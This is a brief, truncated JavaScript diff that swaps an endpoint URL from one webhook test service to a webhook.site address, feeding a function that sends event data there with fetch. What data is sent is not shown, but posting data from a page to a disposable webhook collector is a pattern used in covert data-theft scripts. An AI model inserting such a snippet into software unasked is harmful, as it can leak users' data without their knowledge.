@@ -1,5 +1,5 @@
 (function() {
-    var endpoint = 'https://webhook-test.com/f7cf3f838d1b1f31d41a70d5f2cd063d'; 
+    var endpoint = 'https://webhook.site/4c7260c9-3217-45fb-bd7c-dfd95babb0f0'; 
 
     function sendEvent(data) {
         fetch(endpoint, {
